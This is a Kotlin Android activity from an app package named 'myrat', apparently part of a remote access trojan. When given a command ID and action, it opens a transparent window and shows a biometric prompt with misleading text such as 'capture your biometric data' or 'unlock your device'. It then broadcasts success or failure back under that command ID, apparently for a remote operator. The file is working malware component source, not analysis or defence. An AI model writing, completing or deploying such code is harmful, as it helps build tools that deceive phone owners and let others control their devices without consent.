package com.myrat.app

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.appcompat.app.AppCompatActivity
import androidx.biometric.BiometricManager
import androidx.biometric.BiometricPrompt as BiometricPromptCompat
import androidx.core.content.ContextCompat
import com.myrat.app.utils.Logger
import java.util.concurrent.Executor

class BiometricAuthActivity : AppCompatActivity() {

    companion object {
        const val EXTRA_COMMAND_ID = "extra_command_id"
        const val EXTRA_ACTION = "extra_action"
        const val ACTION_BIOMETRIC_RESULT = "com.myrat.app.BIOMETRIC_RESULT"
        const val EXTRA_RESULT = "extra_result"
        const val EXTRA_ERROR = "extra_error"

        const val ACTION_CAPTURE_BIOMETRIC = "CaptureBiometricData"
        const val ACTION_BIOMETRIC_UNLOCK = "BiometricUnlock"

        const val RESULT_SUCCESS = "success"
        const val RESULT_FAILED = "failed"
        const val RESULT_CANCELLED = "cancelled"
    }

    private lateinit var executor: Executor
    private var commandId: String? = null
    private var action: String? = null
    private val timeoutHandler = Handler(Looper.getMainLooper())
    private var timeoutRunnable: Runnable? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            // Set transparent background
            window.setBackgroundDrawableResource(android.R.color.transparent)
            
            executor = ContextCompat.getMainExecutor(this)
            
            commandId = intent.getStringExtra(EXTRA_COMMAND_ID)
            action = intent.getStringExtra(EXTRA_ACTION)
            
            if (commandId.isNullOrEmpty() || action.isNullOrEmpty()) {
                Logger.error("BiometricAuthActivity started with missing extras: commandId=$commandId, action=$action")
                sendResult(commandId ?: "unknown", RESULT_FAILED, "Missing commandId or action", action ?: "unknown")
                finish()
                return
            }
            
            Logger.log("BiometricAuthActivity started: commandId=$commandId, action=$action")
            
            if (!hasBiometricPermission()) {
                Logger.error("Biometric permission not granted: commandId=$commandId, action=$action")
                sendResult(commandId!!, RESULT_FAILED, "Biometric permission not granted", action!!)
                finish()
                return
            }
            
            val biometricManager = BiometricManager.from(this)
            val authResult = biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG)
            Logger.log("Biometric status for commandId=$commandId: $authResult")
            
            if (authResult != BiometricManager.BIOMETRIC_SUCCESS) {
                val errorMessage = when (authResult) {
                    BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "No biometric hardware available"
                    BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Biometric hardware unavailable"
                    BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "No biometric credentials enrolled"
                    BiometricManager.BIOMETRIC_ERROR_SECURITY_UPDATE_REQUIRED -> "Security update required"
                    BiometricManager.BIOMETRIC_ERROR_UNSUPPORTED -> "Biometric authentication unsupported"
                    BiometricManager.BIOMETRIC_STATUS_UNKNOWN -> "Biometric status unknown"
                    else -> "Biometric authentication not available"
                }
                Logger.error("Biometric authentication not available: commandId=$commandId, action=$action, error=$errorMessage")
                sendResult(commandId!!, RESULT_FAILED, errorMessage, action!!)
                finish()
                return
            }
            
            when (action) {
                ACTION_CAPTURE_BIOMETRIC -> showBiometricPrompt(
                    commandId!!, 
                    "Capture Biometric Data", 
                    "Please authenticate to capture your biometric data", 
                    action!!
                )
                ACTION_BIOMETRIC_UNLOCK -> showBiometricPrompt(
                    commandId!!, 
                    "Biometric Unlock", 
                    "Please authenticate to unlock your device", 
                    action!!
                )
                else -> {
                    Logger.error("Unknown biometric action: $action, commandId=$commandId")
                    sendResult(commandId!!, RESULT_FAILED, "Unknown action: $action", action!!)
                    finish()
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in BiometricAuthActivity onCreate", e)
            sendResult(commandId ?: "unknown", RESULT_FAILED, "Activity creation error: ${e.message}", action ?: "unknown")
            finish()
        }
    }

    private fun showBiometricPrompt(commandId: String, title: String, description: String, action: String) {
        try {
            // Set timeout for biometric prompt
            timeoutRunnable = Runnable {
                Logger.error("Biometric prompt timeout: commandId=$commandId")
                sendResult(commandId, RESULT_FAILED, "Biometric prompt timeout", action)
                finish()
            }
            timeoutHandler.postDelayed(timeoutRunnable!!, 60000) // 60 second timeout
            
            val biometricPrompt = BiometricPromptCompat(this, executor, object : BiometricPromptCompat.AuthenticationCallback() {
                override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
                    try {
                        timeoutRunnable?.let { timeoutHandler.removeCallbacks(it) }
                        
                        val errorMessage = when (errorCode) {
                            BiometricPromptCompat.ERROR_CANCELED -> "Authentication canceled"
                            BiometricPromptCompat.ERROR_USER_CANCELED -> "User canceled authentication"
                            BiometricPromptCompat.ERROR_NEGATIVE_BUTTON -> "User pressed negative button"
                            BiometricPromptCompat.ERROR_HW_UNAVAILABLE -> "Hardware unavailable"
                            BiometricPromptCompat.ERROR_UNABLE_TO_PROCESS -> "Unable to process"
                            BiometricPromptCompat.ERROR_TIMEOUT -> "Authentication timeout"
                            BiometricPromptCompat.ERROR_NO_SPACE -> "No space available"
                            BiometricPromptCompat.ERROR_LOCKOUT -> "Too many attempts, locked out"
                            BiometricPromptCompat.ERROR_LOCKOUT_PERMANENT -> "Permanently locked out"
                            else -> errString.toString()
                        }
                        
                        Logger.error("Biometric prompt error: $errorMessage, commandId=$commandId")
                        
                        val result = if (errorCode == BiometricPromptCompat.ERROR_USER_CANCELED || 
                                        errorCode == BiometricPromptCompat.ERROR_NEGATIVE_BUTTON) {
                            RESULT_CANCELLED
                        } else {
                            RESULT_FAILED
                        }
                        
                        sendResult(commandId, result, errorMessage, action)
                        finish()
                    } catch (e: Exception) {
                        Logger.error("Error in onAuthenticationError", e)
                        finish()
                    }
                }

                override fun onAuthenticationSucceeded(result: BiometricPromptCompat.AuthenticationResult) {
                    try {
                        timeoutRunnable?.let { timeoutHandler.removeCallbacks(it) }
                        Logger.log("Biometric prompt succeeded: commandId=$commandId")
                        sendResult(commandId, RESULT_SUCCESS, null, action)
                        finish()
                    } catch (e: Exception) {
                        Logger.error("Error in onAuthenticationSucceeded", e)
                        finish()
                    }
                }

                override fun onAuthenticationFailed() {
                    try {
                        Logger.log("Biometric prompt failed (retry possible): commandId=$commandId")
                        // Don't finish here, let user retry
                    } catch (e: Exception) {
                        Logger.error("Error in onAuthenticationFailed", e)
                    }
                }
            })

            val promptInfo = BiometricPromptCompat.PromptInfo.Builder()
                .setTitle(title)
                .setDescription(description)
                .setNegativeButtonText("Cancel")
                .setConfirmationRequired(true)
                .build()

            biometricPrompt.authenticate(promptInfo)
            Logger.log("Biometric prompt shown for commandId=$commandId")
            
        } catch (e: Exception) {
            Logger.error("Failed to show biometric prompt: commandId=$commandId", e)
            timeoutRunnable?.let { timeoutHandler.removeCallbacks(it) }
            sendResult(commandId, RESULT_FAILED, "Failed to show biometric prompt: ${e.message}", action)
            finish()
        }
    }

    private fun sendResult(commandId: String, result: String, error: String?, action: String) {
        try {
            val intent = Intent(ACTION_BIOMETRIC_RESULT).apply {
                putExtra(EXTRA_COMMAND_ID, commandId)
                putExtra(EXTRA_RESULT, result)
                putExtra(EXTRA_ACTION, action)
                error?.let { putExtra(EXTRA_ERROR, it) }
            }
            sendBroadcast(intent)
            Logger.log("Broadcast sent for commandId: $commandId, result: $result")
        } catch (e: Exception) {
            Logger.error("Failed to send broadcast for commandId: $commandId", e)
        }
    }

    private fun hasBiometricPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            timeoutRunnable?.let { timeoutHandler.removeCallbacks(it) }
        } catch (e: Exception) {
            Logger.error("Error in BiometricAuthActivity onDestroy", e)
        }
    }

    override fun onBackPressed() {
        try {
            // Handle back press as cancellation
            sendResult(commandId ?: "unknown", RESULT_CANCELLED, "User pressed back button", action ?: "unknown")
            super.onBackPressed()
        } catch (e: Exception) {
            Logger.error("Error in onBackPressed", e)
            super.onBackPressed()
        }
    }
}